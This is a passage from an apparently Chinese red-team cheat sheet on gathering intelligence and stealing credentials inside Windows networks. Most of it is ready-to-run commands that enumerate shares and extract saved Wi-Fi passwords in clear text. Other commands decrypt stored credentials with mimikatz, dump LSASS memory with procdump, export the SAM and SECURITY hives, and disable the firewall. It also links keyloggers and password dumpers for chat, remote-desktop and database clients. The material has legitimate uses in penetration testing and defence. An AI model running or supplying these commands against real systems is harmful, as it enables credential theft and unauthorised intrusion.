<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://<span class="number">3</span>gstudent.github.io/Windows<span class="symbol">%E4</span><span class="symbol">%B8</span><span class="symbol">%8</span>B<span class="symbol">%E5</span><span class="symbol">%89</span><span class="symbol">%AA</span><span class="symbol">%E8</span><span class="symbol">%B4</span><span class="symbol">%B4</span><span class="symbol">%E6</span><span class="symbol">%9</span>D<span class="symbol">%BF</span><span class="symbol">%E7</span><span class="symbol">%9</span>A<span class="symbol">%84</span><span class="symbol">%E5</span><span class="symbol">%88</span><span class="symbol">%A9</span><span class="symbol">%E7</span><span class="symbol">%94</span><span class="symbol">%A8</span></span><br></pre></td></tr></table></figure>



<h4 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h4><blockquote>
<p>在内网环境下，如果没做好网络隔离，通常会有共享权限配置不当的情况，直接就能访问内容，在实战中遇到过开发将密码、代码、开连环境、漏洞测试报告等资料未加密存放。</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">net</span> <span class="title">share</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">wmic</span> <span class="title">share</span> <span class="title">get</span> <span class="title">name</span>,<span class="title">path</span>,<span class="title">status</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>在域中查询存在共享的主机名</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询共享主机列表</span></span><br><span class="line">C:\Users\Nobody&gt; net view</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询指定机器共享</span></span><br><span class="line">C:\Users\Nobody&gt; net view \\&lt;HOSTNAME&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用PoserShell(2012之后的PS3.0版本才支持)</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Nobody&gt; <span class="built_in">Get-DomainComputer</span> | <span class="built_in">Get-NetShare</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Nobody&gt; <span class="built_in">Find-DomainShare</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询其他域共享</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Nobody&gt; <span class="built_in">Find-DomainShare</span> <span class="literal">-domain</span> &lt;Domain name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询共享是否可读</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Nobody&gt; <span class="built_in">Find-DomainShare</span> <span class="literal">-CheckShareAccess</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>磁盘映射，直接将网络共享盘符映射到本地方便访问</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 将HOST的 c$ 共享盘符 C盘 映射到本地的 K盘</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">net</span> <span class="title">use</span> <span class="title">k</span>: \\&lt;<span class="title">Host</span>&gt;\<span class="title">c</span>$ &lt;<span class="title">Password</span>&gt; /<span class="title">u</span>:&lt;<span class="title">UserName</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果共享主机没有认证可以直接操作</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">CD</span> \\&lt;<span class="title">HOST</span>&gt;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">COPY</span> \\&lt;<span class="title">Host</span>&gt;\&lt;<span class="title">File</span>&gt; <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">tasks</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">COPY</span> <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">tasks</span> \\&lt;<span class="title">Host</span>&gt;\&lt;<span class="title">File</span>&gt; </span></span><br></pre></td></tr></table></figure>



<h4 id="回收站"><a href="#回收站" class="headerlink" title="回收站"></a>回收站</h4><blockquote>
<p>遍历回收站目录 <code>C:\$Recycle.Bin</code> 下每个用户 sid，这个 sid 目录里包含删除文件，以 <code>$I</code> 开头的文件内容是删除文件前存放路径，<code>$R</code> 开头的文件就是回收站里的数据。</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /f &quot;skip=<span class="number">1</span> tokens=<span class="number">1</span>,<span class="number">2</span> delims= &quot; %c <span class="keyword">in</span> (&#x27;wmic useraccount get name^,sid&#x27;) <span class="keyword">do</span> <span class="built_in">dir</span> /a /b C:\$Recycle.Bin\%d\ AccountNameIs:%c <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br></pre></td></tr></table></figure>



<h4 id="Wi-Fi"><a href="#Wi-Fi" class="headerlink" title="Wi-Fi"></a>Wi-Fi</h4><blockquote>
<p>以下Wi-Fi查询命令需要<code>wlansvc</code>服务处于运行状态</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询wlansvc服务是否开启</span></span><br><span class="line">sc query wlansvc | findstr STATE</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取wlan profile 查看连接过哪些Wi-Fi</span></span><br><span class="line">netsh wlan show profile</span><br><span class="line"></span><br><span class="line"><span class="comment">## 获取所有可以搜索到的Wi-Fi</span></span><br><span class="line">netsh wlan show networks <span class="attribute">mode</span>=bssid</span><br><span class="line"></span><br><span class="line"><span class="comment">## 获取指定profile 的明文密码</span></span><br><span class="line">netsh wlan show<span class="built_in"> profile </span><span class="attribute">name</span>=<span class="string">&quot;SSID名称&quot;</span> <span class="attribute">key</span>=clear</span><br><span class="line"></span><br><span class="line"><span class="comment">## 获取所有电脑曾经连接过的Wi-Fi密码</span></span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>) <span class="keyword">do</span> @echo %j | findstr -i -v echo | netsh wlan show profiles %j <span class="attribute">key</span>=clear</span><br></pre></td></tr></table></figure>



<h4 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h4><blockquote>
<p>命名规则</p>
</blockquote>
<blockquote>
<p>手动搜索</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Google 搜索</span></span><br><span class="line"><span class="comment"># github 搜索</span></span><br><span class="line"><span class="comment"># 网上数据泄露搜索</span></span><br><span class="line">https:<span class="regexp">//m</span>onitor.firefox.com/</span><br><span class="line">https:<span class="regexp">//</span>haveibeenpwned.com/</span><br><span class="line">https:<span class="regexp">//g</span>hostproject.fr/</span><br></pre></td></tr></table></figure>

<blockquote>
<p>以下两个工具可以一键搜集暴漏在互联网上的邮箱信息</p>
<p><a target="_blank" rel="noopener" href="https://github.com/laramies/theHarvester">The Harvester</a></p>
<p>[Infofa](<a target="_blank" rel="noopener" href="https://github.com/m4ll0k/Infoga.git">https://github.com/m4ll0k/Infoga.git</a> /data/infoga)</p>
</blockquote>
<blockquote>
<p>MailSniper</p>
<p>前提是获取到一个邮箱账号密码以后进行通讯录收集</p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-GlobalAddressList -ExchHostname mail.<span class="keyword">domain</span>.com -UserName <span class="keyword">domain</span>\username -<span class="keyword">Password</span> Fall2016 -OutFile <span class="keyword">global</span>-address-list.txt</span><br></pre></td></tr></table></figure>





<h4 id="凭证管理器"><a href="#凭证管理器" class="headerlink" title="凭证管理器"></a>凭证管理器</h4><blockquote>
<p>Windows 提供 Data Protection API（DPAPI）来加解密数据，每台机器使用的密钥都不同。DPAPI 应用的地方很多，主要分 Web Credentials 和 Windows Credentials 两块。比如前面 aspnet_regiis.exe 用来加密 web.conf 配置文件，RDP 保存的密码是 Windows Credentials，Chrome、Edge 浏览器保存的密码是 Web Credentials。</p>
</blockquote>
<blockquote>
<p>当前保存的凭证</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># cmdkey 获取</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">cmdkey</span> /<span class="title">list</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">valutcmd</span> 获取</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">vaultcmd</span> /<span class="title">listcreds</span>:&quot;<span class="title">Web</span> 凭据&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上一步可以获取到登录用户名，如果之前使用过<code>runas</code>的<code>savecred</code>选项来保存密码的话，后续再带上该选项就无需密码，所以之前凭证发现的用户名都可以试一下</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">runas</span> /<span class="title">savecred</span> /<span class="title">user</span>:&lt;<span class="title">user</span>&gt; <span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">runas</span> /<span class="title">savecred</span> /<span class="title">user</span>:&lt;<span class="title">domain</span>\<span class="title">user</span>&gt; <span class="title">beacon.exe</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/List-RDP-Connections-History">3gstudent</a>的脚本可以一键获取</p>
</blockquote>
<blockquote>
<p>远程登录记录</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 当前用户连接过的主机</span><br><span class="line"><span class="built_in">dir</span> &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; -Name</span><br><span class="line"></span><br><span class="line"># 当前主机连接过指定IP的用户名</span><br><span class="line">(Get-ItemProperty -<span class="built_in">Path</span> &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span>&quot;).UsernameHint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 遍历 Credentials 目录下保存的凭据</span><br><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>

<blockquote>
<p>远程登录密码</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 遍历 Credentials 目录下保存的凭据</span><br><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br><span class="line"></span><br><span class="line"># 可以使用Mimikatz进行导出</span><br><span class="line">## 获取Credentials</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">dir</span> /<span class="title">a</span> %<span class="title">userprofile</span>%\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Microsoft</span>\<span class="title">Credentials</span>\*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">## 使用<span class="title">mimitakz</span>解密<span class="title">MasterKey</span>，从解密结果中获取<span class="title">guidMasterKey</span>的值，确认是真实凭证加密密钥。</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">mimikatz.exe</span> &quot;<span class="title">privilege</span>::<span class="title">debug</span>&quot; &quot;<span class="title">dpapi</span>::<span class="title">cred</span> /<span class="title">in:C</span>:\<span class="title">Users</span>\&lt;<span class="title">UserName</span>&gt;\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Microsoft</span>\<span class="title">Credentials</span>\&lt;<span class="title">Credentials</span>&gt;&quot; &quot;<span class="title">sekurlsa</span>::<span class="title">dpapi</span>&quot; &quot;<span class="title">exit</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">## 通过密钥解密得到账号密码</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">mimikatz.exe</span> &quot;<span class="title">privilege</span>::<span class="title">debug</span>&quot; &quot;<span class="title">dpapi</span>::<span class="title">cred</span> /<span class="title">in</span>:%<span class="title">userprofile</span>%\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Microsoft</span>\<span class="title">Credentials</span>\&lt;<span class="title">Credentials</span>&gt; /<span class="title">masterkey</span>:&lt;<span class="title">guid</span>对应的<span class="title">masterkey</span>&gt;&quot; &quot;<span class="title">exit</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">## 当然也可以用<span class="title">SharpDPAPI</span>一键获取</span></span><br><span class="line"><span class="function"><span class="title">SharpDPAPI.exe</span> <span class="title">rdg</span> /<span class="title">unprotect</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">## <span class="title">Dialupass</span>一键获取</span></span><br><span class="line"><span class="function"><span class="title">Dialupass.exe</span> /<span class="title">stext</span> 2.<span class="title">txt</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>获取RDP或者SSH连接记录可以获取网段和密码等信息，定位运维</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Windows</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">reg</span> <span class="title">query</span> &quot;<span class="title">HKEY_CURRENT_USER</span>\<span class="title">Software</span>\<span class="title">Microsoft</span>\<span class="title">Terminal</span> <span class="title">Server</span> <span class="title">Client</span>\<span class="title">Servers</span>&quot; /<span class="title">s</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">Linux</span></span></span><br><span class="line"><span class="function"><span class="title">last</span></span></span><br></pre></td></tr></table></figure>

<h4 id="PPTP-VPN"><a href="#PPTP-VPN" class="headerlink" title="PPTP VPN"></a>PPTP VPN</h4><blockquote>
<p>获取配置文件信息</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">type</span> %<span class="title">APPDATA</span>%\<span class="title">Microsoft</span>\<span class="title">Network</span>\<span class="title">Connections</span>\<span class="title">Pbk</span>\<span class="title">rasphone.pbk</span></span></span><br><span class="line"><span class="function"><span class="title">DEVICE</span>:配置文件名称</span></span><br><span class="line"><span class="function"><span class="title">PhoneNumber</span>: 服务器<span class="title">IP</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用Mimikatz获取账号密码</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">mimikatz.exe</span> &quot;<span class="title">privilege</span>::<span class="title">debug</span>&quot; &quot;<span class="title">token</span>::<span class="title">elevate</span>&quot; &quot;<span class="title">lsadump</span>::<span class="title">secrets</span>&quot; &quot;<span class="title">exit</span>&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>连接到VPN</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 前面读取到的DEVICE作为第一个参数,后两个是用户名和密码</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">rasdial</span> &quot;<span class="title">VPN</span>配置文件名称&quot; &lt;<span class="title">vpnuser</span>&gt; &lt;<span class="title">vpnpasswd</span>&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查看链接</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">rsadial</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 断开连接</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">rasphone</span> -<span class="title">h</span> &quot;<span class="title">VPN</span>配置文件名称&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><blockquote>
<p>Kylogger</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/uknowsec/</span>keylogger</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Lingerhk/</span>hacking_script<span class="regexp">/tree/m</span>aster/keylogger</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Karlann</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/hkx3upper/</span>Karlann</span><br></pre></td></tr></table></figure>



<h4 id="软件密码"><a href="#软件密码" class="headerlink" title="软件密码"></a>软件密码</h4><blockquote>
<p>微信、钉钉、QQ、百度网盘</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 微信</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/xaoyaoo/</span>PyWxDump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 钉钉</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># QQ</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Yiyiyimu/</span>QQ-History-Backup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 百度网盘</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>Navicat、Keepass、Xshell、PuTTY、FileZilla</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Navicat</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/HyperSine/</span>how-does-navicat-encrypt-password</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leepass</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Orange-Cyberdefense/</span>KeePwn</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/alt3kx/</span>CVE-<span class="number">2023</span>-<span class="number">24055</span>_PoC</span><br><span class="line"></span><br><span class="line"><span class="comment"># Xshell</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/JDArmy/</span>SharpXDecrypt</span><br><span class="line"></span><br><span class="line"><span class="comment"># PuTTY</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Arvanaghi/</span>SessionGopher</span><br><span class="line"></span><br><span class="line"><span class="comment"># FileZilla</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/uknowsec/</span>SharpDecryptPwd</span><br></pre></td></tr></table></figure>



<blockquote>
<p>向日葵、Todesk、TeamViewer、AnyDesk</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 向日葵</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/RuoJi6/</span>Deskbypass?tab=readme-ov-file</span><br><span class="line"></span><br><span class="line"><span class="comment"># Todesk</span></span><br><span class="line">C:\Program Files (x86)\ToDesk\config.ini</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># TeamViewer</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/attackercan/</span>teamviewer-dumper</span><br><span class="line"></span><br><span class="line"><span class="comment"># AnyDesk</span></span><br><span class="line">%APPDATA%\AnyDesk</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>数据库</p>
</blockquote>
<blockquote>
<p>本地账号</p>
</blockquote>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Mimikataz</span></span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br><span class="line"><span class="section"># Mimikataz将dump结果并将hash保存为log日志文件</span></span><br><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section"># [<span class="string">Procdump</span>](<span class="link">https://learn.microsoft.com/en-us/sysinternals/downloads/procdump</span>)</span></span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp // 32 位</span><br><span class="line">procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp // 64 位</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br><span class="line"></span><br><span class="line"><span class="section"># [<span class="string">nanodump</span>](<span class="link">https://github.com/helpsystems/nanodump</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section"># [<span class="string">hashdump</span>](<span class="link">https://github.com/lengjibo/RedTeamTools/tree/master/windows/hashdump</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section"># [<span class="string">Out-Minidump</span>](<span class="link">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section"># [<span class="string">SharpDump</span>](<span class="link">https://github.com/GhostPack/SharpDump</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 注册表导出sam文件</span></span><br><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="防火墙信息"><a href="#防火墙信息" class="headerlink" title="防火墙信息"></a>防火墙信息</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CMD查看防火墙启动状态</span></span><br><span class="line">netsh advfirewall show allprofile</span><br><span class="line"></span><br><span class="line"><span class="comment"># PS查看防火墙启用状态</span></span><br><span class="line">Get-NetFirewallProfile | Format-Table Name, Enabled</span><br><span class="line"></span><br><span class="line"><span class="comment"># PS查看防火墙规则</span></span><br><span class="line">Get-NetFirewallRule | where Enabled -eq <span class="string">&quot;True&quot;</span> | Format-List DisplayName, Enabled, Description</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看防火墙详细规则，查看出入站限制端口，白名单设置等</span></span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span>show rule <span class="attribute">name</span>=all verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭防火墙WinServer 2003之前</span></span><br><span class="line">netsh<span class="built_in"> firewall </span><span class="builtin-name">set</span> opmode disabled</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭防火墙WinServer 2003之后</span></span><br><span class="line">netsh advfirewall <span class="builtin-name">set</span> allprofiles state off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看Windows系统代理连接</span></span><br><span class="line">REG QUERY <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span> /v ProxyServer</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 Windows 系统代理 PAC 脚本连接</span></span><br><span class="line">REG QUERY <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span> /v AutoConfigURL</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="自动化收集"><a href="#自动化收集" class="headerlink" title="自动化收集"></a>自动化收集</h3><blockquote>
<p>市面上的信息自动化收集工具很多，侧重的点也不一样</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 执行所有信息收集</span><br><span class="line">Seatbelt.exe -<span class="keyword">group</span>=<span class="keyword">all</span> -<span class="keyword">full</span></span><br></pre></td></tr></table></figure>

<blockquote>
